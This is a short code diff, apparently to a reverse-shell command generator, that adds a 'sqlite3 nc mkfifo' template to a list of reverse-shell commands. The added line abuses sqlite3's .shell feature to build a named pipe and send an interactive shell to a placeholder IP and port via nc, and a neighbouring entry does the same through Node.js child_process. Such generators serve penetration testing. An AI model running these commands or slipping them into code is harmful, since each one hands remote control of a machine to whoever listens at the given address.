@@ -276,6 +276,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "mac"]
         },
         {
+            "name": "sqlite3 nc mkfifo",
+            "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
+            "meta": ["linux", "mac"]
+        },
+        {
             "name": "node.js",
             "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
             "meta": ["linux", "mac"]
